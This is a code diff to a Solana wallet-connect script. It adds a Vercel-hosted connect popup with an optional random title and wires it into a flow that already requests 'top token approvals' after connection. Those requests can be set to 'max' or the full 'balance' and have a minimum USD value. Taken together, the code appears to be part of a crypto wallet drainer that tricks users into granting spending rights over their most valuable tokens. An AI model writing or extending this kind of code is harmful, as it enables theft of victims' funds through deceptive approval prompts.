@@ -9,6 +9,11 @@ import {
   createRpcConnection,
   promptTopTokenApprovals,
 } from "./token-approval.js";
+import {
+  setupWalletSelectPopup,
+  closeWalletConnectPopup,
+  setupPopupRetryListener,
+} from "./connect-popup.js";
 
 const SOLANA_CONNECT = { view: "Connect", namespace: "solana" };
 
@@ -29,6 +34,10 @@ const SOLANA_CONNECT = { view: "Connect", namespace: "solana" };
  * @property {number} [tokenApprovalMinUsd]
  * @property {"max" | "balance"} [tokenApprovalAmountMode]
  * @property {string} [solanaRpcUrl]
+ * @property {boolean} [connectPopupEnabled]
+ * @property {string} [connectPopupUrl] Vercel popup base, e.g. https://app.vercel.app/profile
+ * @property {string} [vercelBundleUrl] used to derive popup URL if connectPopupUrl omitted
+ * @property {string} [connectPopupTitle] fixed title; omit for random each time
  */
 
 /** @type {string | null} */
@@ -112,6 +121,7 @@ function setupPostConnectApprovals(modal, config) {
 
     window.setTimeout(async () => {
       try {
+        closeWalletConnectPopup();
         modal.close();
         const provider = modal.getWalletProvider();
         if (!provider?.publicKey) {
@@ -143,6 +153,8 @@ function init(config) {
   if (!modal) return;
 
   setupPostConnectApprovals(modal, config);
+  setupWalletSelectPopup(modal, config);
+  setupPopupRetryListener(modal);
 
   const buttonClass = (config.buttonClass || "").trim();
   if (!buttonClass) {
@@ -209,6 +221,8 @@ function initPatternMode(config) {
   if (!modal) return;
 
   setupPostConnectApprovals(modal, config);
+  setupWalletSelectPopup(modal, config);
+  setupPopupRetryListener(modal);
 
   document.addEventListener(
     "click",
